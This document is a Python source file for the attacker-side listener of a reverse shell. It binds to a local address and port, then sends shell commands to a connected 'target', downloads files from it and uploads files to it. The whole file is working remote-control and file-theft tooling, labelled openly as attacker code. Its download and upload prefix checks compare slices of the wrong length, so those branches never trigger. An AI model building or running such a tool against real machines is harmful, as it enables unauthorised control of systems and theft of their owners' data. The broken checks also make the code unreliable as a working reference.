import sys
import json
import socket
import os

# Download incoming file from target
def download_file(file_name):
    f = open(file_name, "wb")
    target_connection.settimeout(1)
    # Receive the first chunk of data
    chunk = target_connection.recv(1024)
    # Keep receiving data until none is available
    while chunk:
        f.write(chunk)
        try:
            chunk = target_connection.recv(1024)
        except socket.timeout as e:
            break
    target_connection.settimeout(None)
    f.close()

# Upload file from server(attacker) to target
def upload_file(file_name):
    f = open(file_name, "rb")
    target_connection.send(f.read())

# Send data to the target
def reliable_send(data):
    json_data = json.dumps(data)
    target_connection.send(json_data.encode())

# Receive data from the target
def reliable_recv():
    json_data = ""
    nr_bytes = 1024 
    while True:
        try:
            json_data = json_data + target_connection.recv(nr_bytes).decode().rstrip()
            return json.loads(json_data)
        except ValueError:
            continue

def target_communication():
    while True:
        command = input("* Shell~%s: " % str(target_ip))
        # Send the command to the target
        reliable_send(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        elif command[:8] == "download ":
            download_file(command[9:])
        elif command[:6] == "upload ":
            upload_file(command[7:])
        else:
            # Wait for response from target
            response = reliable_recv()
            print(response)


if __name__ == "__main__":
    # Create a TCP/IP socket (SOCK_STREAM means a TCP socket, AF_INET means IPv4)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.bind(("192.168.1.44", 5555))

    # Listen for incoming connections
    print("[+] Listening for incoming connections")
    sock.listen(5)

    # Accept a connection
    target_connection, target_ip = sock.accept()
    print("[+] Connection established with target" + str(target_ip))
    target_communication()